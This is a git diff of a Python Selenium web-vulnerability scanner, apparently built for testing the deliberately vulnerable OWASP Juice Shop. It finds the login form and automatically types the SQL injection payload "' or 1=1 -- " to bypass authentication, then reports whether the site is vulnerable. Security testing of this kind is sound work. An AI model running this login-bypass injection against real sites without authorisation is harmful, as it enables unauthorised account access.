@@ -2,6 +2,7 @@ from time import sleep
 from random import uniform
 from .soup_methods import find_links, find_buttons, find_inputs
 from bs4 import BeautifulSoup
+from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
@@ -51,25 +52,51 @@ def check_form_val(driver,available,site):
         #Find all inputs
         if find_inputs(soup):
             vulnerable_links.append(link)
+    #check for  login link in vulnerable_links 
+    if '#/login' in  vulnerable_links:
+        link2='/login'
+        loginsqlinjection(site,link2,driver)
+    else:
+        print("login link was not found in available links")
     return vulnerable_links
 
-
-def loginsqlinjection(site,link,driver): #check for sql injection
-    driver.get(f'{site}{link}')
+def loginsqlinjection(site,link2,driver): 
+    #check for sql injection
+    print("Trying to enter site with sqlInjection")
+    print("\n")
+    driver.get(f'{site}{link2}')
+     #open link in firefox browser
+    sleep(3)
+    soup = BeautifulSoup(driver.page_source,'html.parser')
+     #search for all inputs in site
+    inputs=soup.find_all('input')
+    id_list=[]
+    for iinput in inputs: 
+        #search  inputs by tag:id 
+        try:
+             #append id tags for username/email and password in id_list
+            id = iinput['id']
+            if 'mail' in id or 'pass'  in id:
+                 id_list.append(id)  
+        except:
+            pass
+        #type in username/email field sqlinjection
+    driver.find_element_by_id(id_list[0]).send_keys("' or 1=1 -- ") 
+    #type in password field a random text 
+    driver.find_element_by_id(id_list[1]).send_keys('222')
+    #press login button
+    driver.find_element_by_id(id_list[1]).send_keys(Keys.ENTER) 
     sleep(2)
-   # driver.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click() #find login button
-    driver.find_element_by_xpath('//*[@id="email"]').send_keys(" ' or 1=1 -- ")
-    password=driver.find_element_by_xpath('//*[@id="password"]')
-    text='sqlinjection'
-    for characters in text:
-        password.send_keys(characters)
-        sleep(0.3) #set username and password
-    driver.find_element_by_xpath('//*[@id="loginButton"]').click()
-    sleep(5)
-    if driver.current_url=='https://juice-shop.herokuapp.com/#/search': #check if login failed
-          print("your page is vulnerable to sql injection")
+    #check if sqlinjection succeeded and show proper message to user
+    if 'Invalid' in driver.page_source: 
+        print('login failed\n')
     else:
-        print("login failed")
+        print("Your page is vulnerable to sql injection\n")
+    
+    
+
+
+
 
 def xssattack(driver,site,links):
     #Checking for
